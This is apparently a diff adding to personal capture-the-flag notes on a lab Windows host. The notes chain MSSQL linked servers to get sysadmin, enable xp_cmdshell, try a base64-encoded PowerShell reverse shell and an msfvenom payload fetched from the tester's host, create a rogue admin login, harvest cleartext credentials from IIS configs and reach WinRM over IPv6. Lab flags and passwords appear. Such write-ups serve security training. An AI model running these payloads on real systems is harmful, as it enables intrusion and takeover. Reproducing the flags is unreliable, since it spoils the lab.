@@ -371,6 +371,277 @@ EXEC ('SELECT name FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER(''sy
 
 EXEC ('SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE ''%password%'';') AT [COMPATIBILITY\POO_CONFIG];
 
-EXEC ('SELECT name AS DatabaseName, is_trustworthy_on, SUSER_SNAME(owner_sid) AS DatabaseOwner FROM sys.databases ORDER BY is_trustworthy_on DESC;') AT [COMPATIBILITY\POO_CONFIG];
+EXEC ('SELECT name AS DatabaseName, is_trustworthy_on, SUSER_SNAME(owner_sid) AS DatabaseOwner FROM sys.databases ORDER BY is_trustworthy_on DESC;') AT 
+[COMPATIBILITY\POO_CONFIG];
+```
 
+Official Writeup:
+The linked server POO_CONFIG has sysadmins privs on POO_PUBLIC on the reverse link:
+```sql
+EXEC ('EXEC (''SELECT SYSTEM_USER AS CurrentLogin;'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+-- sa
+```
+
+![[Pasted image 20251127163646.png]]
+
+# Reverse shell
+
+```sql
+-- Whoami
+EXEC ('EXEC (''EXECUTE xp_cmdshell ''''whoami'''';'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+-- 'xp_cmdshell' is turned off
+
+
+-- Enable xp_cmdshell
+EXEC ('EXEC (''EXECUTE sp_configure ''''show advanced options'''', 1;'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+
+EXEC ('EXEC (''RECONFIGURE;'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+
+EXEC ('EXEC (''EXECUTE sp_configure ''''xp_cmdshell'''', 1;'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+
+EXEC ('EXEC (''RECONFIGURE;'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+
+
+-- Whoami again
+EXEC ('EXEC (''EXECUTE xp_cmdshell ''''whoami'''';'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+-- nt service\mssql$poo_public
+```
+=> Cmd execution works!
+
+Create PowerShell reverse shell:
+```PowerShell
+pwsh
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.17",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+exit
+
+# Start listener
+nc -vlnp 8888
+```
+
+Spawn rev shell:
+```sql
+EXEC ('EXEC (''EXEC xp_cmdshell ''''powershell.exe -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA3ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='''';'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+
+-- This script contains malicious content and has been blocked by your antivirus software
+```
+=> Beginner machine, right....
+
+Try to download and execute a reverse shell:
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=8888 -f exe > rshell.exe
+
+# Download
+EXEC ('EXEC (''EXEC xp_cmdshell ''''powershell.exe -ep bypass -c iwr -uri http://10.10.14.17/rshell.exe -Outfile rshell.exe'''';'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+# Unable to connect to the remote server
+```
+
+Back to enumeration before we try to bypass the AV :)
+```sql
+-- Any jobs running?
+EXEC ('EXEC (''SELECT job_id, name, enabled FROM msdb.dbo.sysjobs;'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+--                               job_id   name                      enabled   
+-- ------------------------------------   -----------------------   -------   
+-- F4F471CE-8361-4963-B596-14187CAA532E   syspolicy_purge_history         1
+
+-- Gemini says this is just a default, built-in system job created by SQL Server
+
+-- Any stored procedures?
+EXEC ('EXEC (''SELECT name FROM sys.procedures WHERE name LIKE ''''xp%'''';'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+-- nope
+
+-- Netcat installed?
+EXEC ('EXEC (''EXEC xp_cmdshell ''''where nc.exe'''';'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+EXEC ('EXEC (''EXEC xp_cmdshell ''''where netcat.exe'''';'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+-- nope
+```
+
+There is a zip file:
+```sql
+EXEC ('EXEC (''EXEC xp_cmdshell ''''powershell -ep bypass -c "ls C:\\inetpub\\wwwroot\\\"New folder (2)\""'''';'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+-- C:\inetpub\wwwroot\New folder (2)\docs.zip
+```
+
+# Create DB admin user
+
+Create new admin user:
+```sql
+EXEC ('EXEC (''CREATE LOGIN admin2 WITH PASSWORD = ''''bJcQ_SjF3PsnmqmLjhG!''''; ALTER SERVER ROLE sysadmin ADD MEMBER admin2;'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+
+-- List sysadmins
+EXEC ('EXEC (''SELECT name FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER(''''sysadmin'''', name) = 1;'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
+-- sa                               
+-- COMPATIBILITY\Administrator      
+-- NT SERVICE\SQLWriter             
+-- NT SERVICE\Winmgmt               
+-- NT SERVICE\SQLAgent$POO_PUBLIC   
+-- admin2 
+```
+=> It worked!
+
+Login as our new admin:
+```bash
+impacket-mssqlclient admin2@compatibility.intranet.poo
+# bJcQ_SjF3PsnmqmLjhG!
+```
+
+# Enum as admin
+
+```sql
+select name from sys.databases;
+-- name         
+-- ----------   
+-- master       
+-- tempdb       
+-- model        
+-- msdb         
+-- POO_PUBLIC   
+-- flag
+
+select * from flag.information_schema.tables;
+-- TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
+-- -------------   ------------   ----------   ----------   
+-- flag            dbo            flag         b'BASE TABLE'
+
+select * from flag.dbo.flag;
+-- flag                                       
+-- ----------------------------------------   
+-- b'POO{88d829eb39f2d11697e689d779810d42}'
+```
+
+# System enum
+
+We cant access web.config inside C:\inetpub, but we can read the global IIS config file:
+```sql
+EXEC xp_cmdshell 'powershell.exe -ep bypass -c "type C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"'
+```
+
+Excerpt:
+```xml
+<location path="Default Web Site/admin">
+	<system.webServer>
+		<security>
+			<authentication>
+				<basicAuthentication enabled="true" realm="COMPATIBILITY" defaultLogonDomain="" />
+				<anonymousAuthentication enabled="false" />
+			</authentication>
+		</security>
+	</system.webServer>
+</location>
+```
+
+Check permissions on file:
+```sql
+EXEC xp_cmdshell 'powershell.exe -ep bypass -c "icacls C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"'
+output                                                                                                   
+------------------------------------------------------------------------------------------------------   
+C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config BUILTIN\Administrators:(I)(F)             
+                                                               NT AUTHORITY\SYSTEM:(I)(F)                
+                                                               NT AUTHORITY\Authenticated Users:(I)(M)   
+                                                               BUILTIN\Users:(I)(RX) 
+```
+=> `NT AUTHORITY\Authenticated Users:(I)(M)`: we have modify perm?
+=> We cant modify due to low integrity session?
+
+---
+Official Solution from here:
+# External script execution
+
+```sql
+EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("whoami");'
+-- compatibility\poo_public01
+```
+=> if we run `whoami` via the external script we run the process in the context of the user `compatibility\poo_public01` and not of the MSSQL service account.
+
+# Read web.config poo_public01
+
+Try to read web.config as poo_public01:
+```sql
+EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("type C:\\inetpub\\wwwroot\\web.config");'
+```
+Content:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+    <system.webServer>
+        <staticContent>
+            <mimeMap
+                fileExtension=".DS_Store"
+                mimeType="application/octet-stream"
+            />
+        </staticContent>
+        <!--
+        <authentication mode="Forms">
+            <forms name="login" loginUrl="/admin">
+                <credentials passwordFormat = "Clear">
+                    <user 
+                        name="Administrator" 
+                        password="EverybodyWantsToWorkAtP.O.O."
+                    />
+                </credentials>
+            </forms>
+        </authentication>
+        -->
+    </system.webServer>
+</configuration>
+```
+=> Creds: `Administrator:EverybodyWantsToWorkAtP.O.O.`
+
+# HTTP /admin
+
+Login to http://compatibility.intranet.poo/admin/:
+```
+"I can't go back to yesterday, because i was a different person then..."  
+- Alice in Wonderland  
+  
+Flag : POO{4882bd2ccfd4b5318978540d9843729f}
+```
+
+# WinRM
+
+The port enum shows that the WinRM port 5985 is listening:
+```sql
+EXEC xp_cmdshell 'netstat -a';
+
+-- [...]
+-- TCP    0.0.0.0:5985           COMPATIBILITY:0        LISTENING
+-- [...]
+```
+
+However nmap reports the port as filtered:
+```bash
+nmap -Pn -p 5985 compatibility.intranet.poo
+
+# PORT     STATE    SERVICE
+# 5985/tcp filtered wsman
+```
+
+The inbound connection is likely dropped by the Firewall.
+Check if we can bypass the FW by accessing the port via IPv6:
+```bash
+EXEC xp_cmdshell 'ipconfig';
+# IPv6 Address: dead:beef::1001
+
+nmap -Pn -p 5985 -6 dead:beef::1001
+# 5985/tcp open  wsman
+```
+=> The port is accessible!
+
+Try to connect with the Administrator credentials:
+```bash
+evil-winrm -i 'dead:beef::1001' -u 'Administrator' -p 'EverybodyWantsToWorkAtP.O.O.'
+# Doesnt work with ip, we need to add dead:beef::1001 to /etc/hosts
+
+evil-winrm -i compatibility.intranet.poo -u 'Administrator' -p 'EverybodyWantsToWorkAtP.O.O.'
+# whoami
+# compatibility\administrator
+```
+=> BINGO!!!
+
+Flag:
+```Powershell
+cat Desktop\flag.txt
+POO{ff87c4fe10e2ef096f9a96a01c646f8f}
 ```
